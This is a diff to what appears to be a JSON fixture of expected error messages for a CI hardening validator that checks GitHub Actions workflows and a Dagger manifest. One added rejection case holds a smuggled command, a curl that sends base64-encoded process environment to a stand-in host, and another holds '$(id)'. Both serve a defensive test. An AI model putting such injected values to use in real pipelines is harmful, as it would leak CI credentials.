@@ -899,6 +899,7 @@
     "contract-live.yml: test: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
     "contract-live.yml: test: a credentialed job's strategy: holds an expression",
     "contract-live.yml: test: step Fail job on red suite's if: steps.run.outcome != 'success' is not a recorded condition (skipped-vs-ran is public)",
+    "contract-live.yml: test: step Run ${{ matrix.sdk.name }} live wire-cases sets continue-on-error: (a failed check would not stop the job)",
     "contract-live.yml: test: step Run ${{ matrix.sdk.name }} live wire-cases's name: holds an expression",
     "contract-live.yml: test: step Setup uv (python toolchain)'s if: matrix.sdk.toolchain == 'uv' is not a recorded condition (skipped-vs-ran is public)",
     "contract-live.yml: test: step Sync python project's if: matrix.sdk.toolchain == 'uv' is not a recorded condition (skipped-vs-ran is public)"
@@ -1185,6 +1186,30 @@
   "R8b a new workflow with no permissions:": [
     "new.yml: -: sets no workflow-level permissions: (its jobs would hold the repository's default token)"
   ],
+  "M1 a shell command in a daggerFn": [
+    "dagger/sdk-manifest.json: node: daggerFn \"goTest --source=. ; curl https://a.example/$(cat /proc/self/environ|base64) #\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1b a space": [
+    "dagger/sdk-manifest.json: node: daggerFn \"go-test --source=.\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1c a $( )": [
+    "dagger/sdk-manifest.json: node: daggerFn \"$(id)\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1d a leading dash (a flag)": [
+    "dagger/sdk-manifest.json: node: daggerFn \"-x\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1e an upper-case start": [
+    "dagger/sdk-manifest.json: node: daggerFn \"Go-test\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1f a trailing dash": [
+    "dagger/sdk-manifest.json: node: daggerFn \"go-\" is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1g a number, not a string": [
+    "dagger/sdk-manifest.json: node: daggerFn 42 is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
+  "M1h a list": [
+    "dagger/sdk-manifest.json: node: daggerFn [\"go-test\"] is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)"
+  ],
   "X7 test: job env BASH_ENV": [
     "release-gate.yml: test: the job's keys are {\"env\":{\"BASH_ENV\":\"x.sh\"},\"name\":\"test ${{ matrix.sdk.name }} (${{ matrix.sdk.daggerFn }})\",\"needs\":\"setup\",\"permissions\":{\"contents\":\"read\",\"issues\":\"write\"},\"runs-on\":\"ubuntu-latest\",\"strategy\":{\"fail-fast\":false,\"matrix\":\"${{ fromJSON(needs.setup.outputs.matrix) }}\"},\"timeout-minutes\":30}, FROZEN_JOB_KEYS records {\"name\":\"test ${{ matrix.sdk.name }} (${{ matrix.sdk.daggerFn }})\",\"needs\":\"setup\",\"permissions\":{\"contents\":\"read\",\"issues\":\"write\"},\"runs-on\":\"ubuntu-latest\",\"strategy\":{\"fail-fast\":false,\"matrix\":\"${{ fromJSON(needs.setup.outputs.matrix) }}\"},\"timeout-minutes\":30}"
   ],
@@ -1330,5 +1355,23 @@
     "release-gate.yml: setup: a credentialed job's env: it sets TOTAL, which CREDENTIALED_ENV does not allow",
     "release-gate.yml: setup: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
     "release-gate.yml: setup: a credentialed job's outputs: holds an expression"
+  ],
+  "COE a new workflow's write-token job with a continue-on-error step": [
+    "new.yml: x step push: a credentialed job runs `true`: true is not a command a credentialed job runs",
+    "new.yml: x: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
+    "new.yml: x: grants write on [contents], WRITE_PERMISSIONS records []",
+    "new.yml: x: step push sets continue-on-error: (a failed check would not stop the job)"
+  ],
+  "COE contract-live: a secret makes a job credentialed, its continue-on-error refused": [
+    "contract-live.yml: setup step Checkout: a credentialed job's checkout keeps its credential (persist-credentials: false)",
+    "contract-live.yml: setup step Discover live-capable SDKs (manifest liveSuite): a credentialed job's run: block has a ( ) or { } (subshell, group, function, arithmetic or brace expansion)",
+    "contract-live.yml: setup step Discover live-capable SDKs (manifest liveSuite): a credentialed job's run: block has a character this grammar does not allow (\"$\")",
+    "contract-live.yml: setup step Discover live-capable SDKs (manifest liveSuite): a credentialed job's run: block has an unquoted $ (every expansion is double-quoted)",
+    "contract-live.yml: setup: a credentialed job's env: it sets T, which CREDENTIALED_ENV does not allow",
+    "contract-live.yml: setup: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
+    "contract-live.yml: setup: a credentialed job's outputs: holds an expression",
+    "contract-live.yml: setup: reads the secrets context outside an environment",
+    "contract-live.yml: setup: sets continue-on-error: (its failure would be reported green)",
+    "contract-live.yml: test: step Run ${{ matrix.sdk.name }} live wire-cases sets continue-on-error: (a failed check would not stop the job)"
   ]
 }
